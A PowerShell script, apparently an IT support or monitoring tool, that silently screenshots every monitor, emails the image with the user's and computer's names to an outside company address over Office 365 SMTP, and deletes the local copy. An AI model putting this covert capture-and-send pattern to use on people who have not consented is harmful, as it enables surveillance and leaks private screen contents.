[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
function screenshot([Drawing.Rectangle]$bounds, $path) { 
   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
   $graphics = [Drawing.Graphics]::FromImage($bmp)

   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

   $bmp.Save($path)

   $graphics.Dispose()
   $bmp.Dispose()
}
<# EMAIL CONSTANTS #>
$Username = "";
$Password = "";
$FQDN = $env:COMPUTERNAME + "." + $env:USERDNSDOMAIN
$USER = $env:USERNAME

function Send-ToEmail([string]$email, [string]$attachmentpath){

    $message = new-object Net.Mail.MailMessage;
    $message.From = "alerts@apextechservices.com";
    $message.To.Add($email);
    $message.Subject = "Screenshot of user " + $USER + " on computer " + $FQDN;
    $message.Body = "Screenshot of user " + $USER + " on computer " + $FQDN
    $attachment = New-Object Net.Mail.Attachment($attachmentpath);
    $message.Attachments.Add($attachment);

    $smtp = new-object Net.Mail.SmtpClient("smtp.office365.com", "587");
    $smtp.EnableSSL = $true;
    $smtp.Credentials = New-Object System.Net.NetworkCredential($Username, $Password);
    $smtp.send($message);
    $attachment.Dispose();
 }

Add-Type -AssemblyName System.Windows.Forms
$Monitors = [System.Windows.Forms.Screen]::AllScreens
$TotalHeight = 0
$TotalWidth = 0
$Offset = 0
foreach ($Monitor in $Monitors)
{
	$Width = $Monitor.bounds.Width
	$Height = $Monitor.bounds.Height
    $TotalHeight += [int]$Height
    $TotalWidth += [int]$Width
    if ($Monitor.Bounds.Location.X -lt 0){
        if ($Monitor.Bounds.Location.X -lt $Offset){
            $Offset = $Monitor.Bounds.Location.X    
        }
    }
}
if ($monitors.count -gt 1) {
    if ($Offset -lt 0) {
        $TotalWidth += $Offset
        $bounds = [Drawing.Rectangle]::FromLTRB([int]$Offset, 0, [int]$TotalWidth, [int]$Height)
    }
    else {
        $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, [int]$TotalWidth, [int]$Height)
    }
}
else {
    $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, [int]$TotalWidth, [int]$Height)
}
$Filepath = join-path $env:temp "screenshot.png"
screenshot $bounds $Filepath
Send-ToEmail -email "clients@apextechservices.com" -attachmentpath $Filepath;
del $Filepath